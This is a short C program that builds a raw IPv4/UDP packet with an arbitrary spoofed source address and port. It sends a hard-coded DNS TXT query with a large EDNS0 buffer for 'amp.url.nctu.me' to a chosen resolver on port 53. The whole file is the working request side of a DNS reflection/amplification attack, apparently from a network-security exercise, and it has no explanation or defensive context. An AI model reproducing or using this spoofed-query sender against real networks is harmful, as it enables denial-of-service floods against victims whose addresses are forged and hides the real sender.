#include <arpa/inet.h>
#include <assert.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned short checksum(unsigned short *buff, int _16bitword) {
    unsigned long sum;
    for (sum = 0; _16bitword > 0; _16bitword--) sum += htons(*(buff)++);
    do {
        sum = ((sum >> 16) + (sum & 0xFFFF));
    } while (sum & 0xFFFF0000);
    return ~sum;
}

int main(int argc, char *argv[]) {
    assert(argc >= 4);

    int ret;
    unsigned char query[] =
        "\x53\xbe\x01\x20\x00\x01\x00\x00\x00\x00\x00\x01\x03\x61\x6d\x70"
        "\x03\x75\x72\x6c\x04\x6e\x63\x74\x75\x02\x6d\x65\x00\x00\x10\x00"
        "\x01\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x0c\x00\x0a\x00\x08"
        "\x3e\x03\xa3\x03\x9d\x6c\x32\x19";

    const size_t q_size = sizeof(query) - 1;

    const size_t PACKET_SZ =
        sizeof(struct iphdr) + sizeof(struct udphdr) + q_size;

    unsigned char *sendbuff = (unsigned char *)malloc(PACKET_SZ);
    memset(sendbuff, 0, PACKET_SZ);
    int total_len = 0;

    // Construct IP header
    struct iphdr *iph = (struct iphdr *)(sendbuff);
    iph->ihl = 5;
    iph->version = 4;
    iph->id = htons(11262);
    iph->ttl = 64;
    iph->protocol = 17;  // UDP
    ret = inet_aton(argv[1], (struct in_addr *)&iph->saddr);
    assert(ret != 0);
    ret = inet_aton(argv[3], (struct in_addr *)&iph->daddr);
    assert(ret != 0);
    total_len += sizeof(struct iphdr);

    // Construct UDP header
    struct udphdr *udph = (struct udphdr *)(sendbuff + sizeof(struct iphdr));
    udph->source = htons(atoi(argv[2]));
    udph->dest = htons(53);
    udph->check = 0;
    total_len += sizeof(struct udphdr);

    // Put data
    memcpy(sendbuff + total_len, query, q_size);
    total_len += q_size;

    // Fill rest of the header
    udph->len = htons((total_len - sizeof(struct iphdr)));
    iph->tot_len = htons(total_len);
    iph->check =
        htons(checksum((unsigned short *)sendbuff, (sizeof(struct iphdr) / 2)));

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    ret = inet_aton(argv[3], &addr.sin_addr);
    assert(ret != 0);

    int sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    assert(sd != -1);

    int send_len = sendto(sd, sendbuff, PACKET_SZ, 0, (struct sockaddr *)&addr,
                          sizeof(addr));
    assert(send_len >= 0);
}
